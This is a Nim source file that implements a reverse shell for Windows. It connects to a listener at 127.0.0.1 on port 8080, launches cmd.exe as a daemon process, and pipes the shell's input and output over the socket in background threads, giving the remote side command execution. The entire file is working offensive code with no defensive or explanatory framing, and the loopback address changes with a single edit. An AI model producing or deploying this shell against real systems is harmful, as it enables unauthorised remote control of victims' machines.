import net, streams, osproc, threadpool, os

proc isSocketClosed(sock: Socket): bool =
    try:
        if sock.getSocketError() == 10054.OSErrorCode:
            return true
    except:
        return false

proc isProcessAlive(p: Process, sock: Socket) {.thread.} =
    while p.running:
        continue
    sock.close()

proc recvMsg(sock: Socket, input: Stream) {.thread.} =
    while true:
        if sock.isSocketClosed():
            return
        try:
            let cmds: string = sock.recvLine()
            echo cmds
            input.writeLine(cmds)
            input.flush()
        except:
            return
    
proc sendMsg(sock: Socket, output: Stream) {.thread.} =
    var 
        o: TaintedString
    
    while true:
        if sock.isSocketClosed():
            return
        try:
            o = output.readStr(1)
            stdout.write o
            sock.send(o)
        except:
            return
proc connect(sock: Socket, host: string, port: int): bool =
    try:
        sock.connect(host, Port(port))
    
        if sock.getSocketError() == 10054.OSErrorCode:
            return true
    except:
        return false
 
when isMainModule:
    let 
        sock = newSocket()
        port = 8080
        host = "127.0.0.1"

    var c = connect(sock, host, port)

    if c:
        quit()

    var p = startProcess("cmd.exe", options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
    var input = p.inputStream()
    var output = p.outputStream()
    
    spawn isProcessAlive(p, sock)
    spawn sendMsg(sock, output)
    spawn recvMsg(sock, input)
    sync()
